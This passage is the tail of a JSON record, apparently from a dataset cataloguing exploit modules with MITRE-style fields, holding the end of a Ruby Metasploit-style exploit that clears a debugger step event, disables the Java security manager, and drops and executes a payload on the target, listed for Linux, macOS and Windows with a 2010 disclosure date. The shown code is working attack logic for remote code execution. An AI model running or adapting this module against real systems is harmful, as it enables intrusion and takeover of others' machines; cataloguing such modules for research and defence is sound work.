print_status(\"Deleting step event...\")\n    clear_event(EVENT_STEP, r_id)\n\n    print_status(\"Disabling security manager if set...\")\n    disable_sec_manager\n\n    print_status(\"Dropping and executing payload...\")\n    exec_payload(t_id)\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "Mar 12 2010",
    "x_mitre_platforms": [
        "%w{ linux osx win }"
    ]
}